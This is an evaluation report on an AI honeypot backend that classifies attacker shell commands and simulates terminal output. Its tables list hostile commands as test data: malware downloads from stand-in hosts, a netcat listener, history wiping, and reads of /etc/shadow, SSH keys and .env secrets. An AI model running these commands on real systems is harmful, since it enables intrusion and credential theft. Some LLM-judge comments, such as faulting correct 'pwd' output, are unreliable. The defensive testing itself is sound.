# Xynera AI Backend Evaluation Report

This report summarizes the performance evaluation of the Xynera AI Backend across Classification Accuracy, Retrieval Precision, and Response Quality.

- **Timestamp**: 2026-07-27 16:29:14
- **Total Commands Tested**: 61
- **Semantic Retrieval Queries Tested**: 5
- **Total Generations Evaluated**: 14

---

## 📊 Summary of Metrics

| Metric Category | Metric Name | Value | Description |
| :--- | :--- | :--- | :--- |
| **Classification** | Overall Accuracy | `96.72%` | Correct classification of command threat classes |
| **Retrieval** | Overall Accuracy | `90.91%` | Retrieval of correct KB doc or `None` if out-of-scope |
| **Response Quality** | Avg Latency | `2.18s` | Time taken to generate simulation output |
| | No Markdown Code Blocks | `100.00%` | % of outputs without forbidden ``` wrapper |
| | No Conversational Fluff | `100.00%` | % of outputs free of apologies/preambles |
| | No Prompt Leakage | `100.00%` | % of outputs without unstripped bash prompts |
| | Parameter Adaptation | `85.71%` | % of outputs successfully substituting command args |
| **LLM-as-a-Judge** | Avg Realism | `8.07 / 10` | Realism score from Llama-3.1-8b evaluator |
| | Avg Adherence | `8.07 / 10` | simulation rules adherence (no meta-text/conversational text) |
| | Avg Consistency | `9.14 / 10` | Logical alignment with flags/inputs |

---

## 🔍 Detail: Classification Performance

### Class-Wise Metrics
| Class Name | Precision | Recall | F1-Score |
| :--- | :---: | :---: | :---: |
| Defense Evasion | 100.00% | 100.00% | 1.00 |
| Malware Download Attempt | 100.00% | 66.67% | 0.80 |
| Malware Execution Attempt | 83.33% | 100.00% | 0.91 |
| Permission Manipulation | 100.00% | 100.00% | 1.00 |
| Persistence Creation | 100.00% | 100.00% | 1.00 |
| Privilege Escalation Attempt | 100.00% | 100.00% | 1.00 |
| Reconnaissance | 66.67% | 100.00% | 0.80 |
| Reverse Shell Attempt | 100.00% | 100.00% | 1.00 |
| SQL Injection Attempt | 100.00% | 100.00% | 1.00 |
| Unknown | 100.00% | 97.30% | 0.99 |

### Classification Failures & Misclassifications
| Command | Expected Class | Actual/Predicted Class |
| :--- | :--- | :--- |
| `curl -O http://malicious-site.net/miner.exe` | `Malware Download Attempt` | `Malware Execution Attempt` |
| `ping -c 4 8.8.8.8` | `Unknown` | `Reconnaissance` |

---

## 🔍 Detail: Retrieval Performance

### Document-Wise/Class-Wise Metrics
| Target KB Command | Precision | Recall | F1-Score |
| :--- | :---: | :---: | :---: |
| None | 100.00% | 93.33% | 0.97 |
| cat /etc/gateway/router.conf | 100.00% | 100.00% | 1.00 |
| cat /etc/shadow | 100.00% | 100.00% | 1.00 |
| cat /home/dev/backup_status.txt | 100.00% | 100.00% | 1.00 |
| cat /home/ubuntu/.env | 100.00% | 100.00% | 1.00 |
| cat /home/ubuntu/.ssh/backup_key | 100.00% | 100.00% | 1.00 |
| cat /home/ubuntu/.ssh/id_rsa | 100.00% | 100.00% | 1.00 |
| cat /var/www/internal/db_backup.sql | 100.00% | 100.00% | 1.00 |
| cat /var/www/internal/dev_tasks.md | 100.00% | 100.00% | 1.00 |
| chmod | 100.00% | 100.00% | 1.00 |
| crontab | 0.00% | 0.00% | 0.00 |
| crontab -e | 0.00% | 0.00% | 0.00 |
| curl | 100.00% | 100.00% | 1.00 |
| df | 100.00% | 100.00% | 1.00 |
| dmesg | 100.00% | 100.00% | 1.00 |
| docker | 100.00% | 100.00% | 1.00 |
| env | 100.00% | 100.00% | 1.00 |
| find | 0.00% | 0.00% | 0.00 |
| find / -perm -4000 -type f 2>/dev/null | 0.00% | 0.00% | 0.00 |
| free | 100.00% | 100.00% | 1.00 |
| grep | 100.00% | 100.00% | 1.00 |
| history | 0.00% | 0.00% | 0.00 |
| history -c | 0.00% | 0.00% | 0.00 |
| hostname | 100.00% | 100.00% | 1.00 |
| id | 100.00% | 100.00% | 1.00 |
| ifconfig | 100.00% | 100.00% | 1.00 |
| ip | 100.00% | 100.00% | 1.00 |
| iptables | 100.00% | 100.00% | 1.00 |
| last | 100.00% | 100.00% | 1.00 |
| ls | 100.00% | 100.00% | 1.00 |
| lsb_release | 100.00% | 100.00% | 1.00 |
| lscpu | 100.00% | 100.00% | 1.00 |
| mkdir | 0.00% | 0.00% | 0.00 |
| nc | 0.00% | 0.00% | 0.00 |
| nc -lvp 4444 | 0.00% | 0.00% | 0.00 |
| netcat | 100.00% | 100.00% | 1.00 |
| netstat | 100.00% | 50.00% | 0.67 |
| netstat -antp | 0.00% | 0.00% | 0.00 |
| nmap | 100.00% | 100.00% | 1.00 |
| ping | 100.00% | 100.00% | 1.00 |
| ps | 100.00% | 100.00% | 1.00 |
| ss | 100.00% | 100.00% | 1.00 |
| systemctl | 100.00% | 100.00% | 1.00 |
| top | 100.00% | 100.00% | 1.00 |
| uname | 100.00% | 100.00% | 1.00 |
| uptime | 100.00% | 100.00% | 1.00 |
| w | 100.00% | 100.00% | 1.00 |
| wget | 100.00% | 100.00% | 1.00 |
| which | 100.00% | 100.00% | 1.00 |
| whoami | 100.00% | 100.00% | 1.00 |

### Retrieval Failures
| Query / Command | Expected KB Document | Actual Retrieved Document |
| :--- | :--- | :--- |
| `nc -lvp 4444` | `nc` | `nc -lvp 4444` |
| `history -c` | `history` | `history -c` |
| `crontab -e` | `crontab` | `crontab -e` |
| `find / -perm -4000 -type f 2>/dev/null` | `find` | `find / -perm -4000 -type f 2>/dev/null` |
| `netstat -antp` | `netstat` | `netstat -antp` |
| `mkdir /tmp/test` | `None` | `mkdir` |

---

## 🔍 Detail: Response Quality & Simulation Realism

### Sample Generation Log & Scores
| Command | Latency | Code Blocks | No Fluff | No Prompt | Adaptation | Realism | Adherence | Consistency | Judge Feedback |
| :--- | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :--- |
| `nmap -sS -v 192.168.1.1` | 0.62s | ✅ | ✅ | ✅ | ✅ | 9 | 10 | 10 | The output is nearly identical to the reference document, with the only minor deviation being the lack of a timestamp in the 'Nmap done' line. However, this is a minor detail and the overall output is very realistic. The AI avoided any conversational fluff, notes, apologies, explanations, or wrapping the output in markdown code blocks, and the response is logically consistent with the command executed. |
| `wget http://malware.sh/payload.sh` | 0.40s | ✅ | ✅ | ✅ | ❌ | 8 | 1 | 9 | The output is mostly realistic, but it lacks the exact timestamp and the 'Saving to' line is slightly off. The AI also added a security warning that is not present in a real terminal output. The response is consistent with the command executed, but the added security warning breaks adherence. |
| `chmod 777 /var/www/html/uploads` | 0.00s | ✅ | ✅ | ✅ | ❌ | 9 | 8 | 10 | The output is very realistic, but it's missing the trailing newline character at the end. The AI avoided any conversational fluff, but it could have been more precise with the output, as it's slightly indented. The response is perfectly consistent with the command executed, including the flags and arguments. |
| `nc -lvp 4444` | 0.00s | ✅ | ✅ | ✅ | ✅ | 8 | 9 | 10 | The output is very realistic, but it's missing the 'listening on' phrase that is typically seen in the reference output. The AI avoided any conversational fluff and provided a clean terminal output. The response is logically consistent with the command executed, including the port number. |
| `history -c` | 0.00s | ✅ | ✅ | ✅ | ✅ | 8 | 9 | 10 | The output is mostly realistic, but it's missing the exact prompt and the command history number. The AI did a good job avoiding conversational fluff and explanations, but it could be improved. The response is logically consistent with the command executed. |
| `crontab -e` | 0.00s | ✅ | ✅ | ✅ | ✅ | 8 | 8 | 10 | The output is mostly realistic, but it lacks the exact wording of the reference document. The AI should have included the phrase 'Select an editor...' to match the reference. The adherence is high because the AI avoided any explanations or code block tags. The consistency is perfect because the response logically matches the command executed. |
| `find / -perm -4000 -type f 2>/dev/null` | 0.00s | ✅ | ✅ | ✅ | ✅ | 8 | 9 | 10 | The output is very realistic, but it's missing the redirection of stderr to /dev/null, which would typically result in no output on the terminal. The AI response is clean and free of any conversational fluff or explanations, but it's missing the 2>/dev/null part. The output is logically consistent with the command executed. |
| `ps aux` | 14.39s | ✅ | ✅ | ✅ | ✅ | 9 | 10 | 10 | The output is very realistic and matches the reference document. The AI avoided any conversational fluff, notes, apologies, explanations, or wrapping the output in markdown code blocks. The response is logically consistent with the command executed, 'ps aux', and the output is a standard Unix-style process listing. |
| `netstat -antp` | 0.00s | ✅ | ✅ | ✅ | ✅ | 9 | 10 | 9 | The output is very realistic, but it lacks the last line of the reference output, which shows the established connection. The AI response is perfect in terms of adherence, as it does not contain any conversational fluff or explanations. However, the consistency score is slightly lower due to the missing line. |
| `ping -c 4 8.8.8.8` | 15.14s | ✅ | ✅ | ✅ | ✅ | 8 | 9 | 10 | The output is very realistic, but it lacks the initial PING line with the hostname and IP address. The adherence is high because the output is mostly clean, but it's missing the initial PING line. The consistency is perfect because the output matches the command executed, including the flags, arguments, and IP address. |
| `cat /home/ubuntu/.ssh/id_rsa` | 0.00s | ✅ | ✅ | ✅ | ✅ | 9 | 10 | 10 | The output is almost identical to the reference, with the only difference being the exact same output. The AI avoided any conversational fluff, notes, apologies, explanations, or wrapping the output in markdown code blocks. The response is logically consistent with the command executed, as it correctly outputs the contents of the /home/ubuntu/.ssh/id_rsa file. |
| `cat /home/ubuntu/.env` | 0.00s | ✅ | ✅ | ✅ | ✅ | 9 | 9 | 10 | The output is very realistic and closely resembles what a real Linux terminal would output for this command. However, it's missing the exact file path and permissions information that would typically be displayed at the beginning of the output. The AI avoided any conversational fluff, notes, apologies, explanations, or wrapping the output in markdown code blocks, making it a perfect terminal output. The response is logically consistent with the command executed, including the environment variables and database credentials. |
| `mkdir /tmp/test` | 0.00s | ✅ | ✅ | ✅ | ✅ | 9 | 9 | 10 | The output is very realistic, but it's missing the trailing newline character at the end. The AI avoided any conversational fluff, notes, apologies, explanations, or wrapping the output in markdown code blocks. The response is logically consistent with the command executed, creating a new directory in /tmp/test. |
| `pwd` | 0.00s | ✅ | ✅ | ✅ | ✅ | 2 | 2 | 0 | The output '/home/nupur' is not realistic for the 'pwd' command, which should display the current working directory. A real Linux terminal would not output a user's home directory for this command. The AI also failed to adhere to the expected 'command not found' fallback, and the output is not consistent with the command executed. |
